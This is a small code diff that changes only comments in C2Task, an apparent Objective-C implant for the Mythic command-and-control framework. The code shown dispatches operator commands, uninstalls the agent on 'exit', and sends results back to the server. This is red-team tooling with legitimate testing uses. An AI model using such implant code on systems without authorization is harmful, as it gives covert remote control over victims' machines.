@@ -8,6 +8,9 @@
 
 @implementation C2Task
 
+
+/// Create a new task object with the params specified by the
+/// Mythic operator.
 - (instancetype)initWithDictionary:(NSDictionary *)dict {
     self = [super init];
     if (self) {
@@ -21,8 +24,6 @@
 
 - (void)executeTask {
     NSLog(@"[DEBUG] 💥 Executing task: %@", self.command);
-
-    // Dictionary mapping command strings to blocks (similar to a switch case)
     NSDictionary<NSString *, void (^)(void)> *taskCommandMap = @{
         @"exit": ^{
             BOOL deletionSuccess = [SystemInfoHelper uninstallAgent];
@@ -163,9 +164,7 @@
         }
     };
 
-    // Fetch the block for the command, or return an error if not found
     void (^taskBlock)(void) = taskCommandMap[self.command];
-    
     if (taskBlock) {
         taskBlock();
     } else {
@@ -181,6 +180,8 @@
         return;
     }
 
+    /// Construct the response for the executed task that we'll send back
+    /// to Mythic.
     NSDictionary *responseData = @{
         @"action": @"post_response",
         @"responses": @[
